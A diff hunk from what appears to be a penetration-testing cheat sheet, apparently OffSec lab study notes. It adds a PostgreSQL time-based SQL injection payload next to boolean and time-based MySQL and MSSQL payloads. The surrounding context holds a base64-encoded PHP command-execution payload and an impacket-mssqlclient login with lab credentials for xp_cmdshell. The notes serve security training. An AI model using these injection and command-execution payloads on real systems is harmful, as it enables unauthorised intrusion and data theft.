@@ -549,8 +549,9 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - booloan
       `offsec' AND 1=1 -- //`
     - time-based
-      `offsec' AND IF (1=1, sleep(3),'false') -- //`
-      `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
+      `offsec' AND IF (1=1, sleep(3),'false') -- //`  
+      `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`
+      Postgresql: `' AND 3176=(SELECT 3176 FROM PG_SLEEP(5))-- HlYW`  
   - xp_cmdshell
     ```
     impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
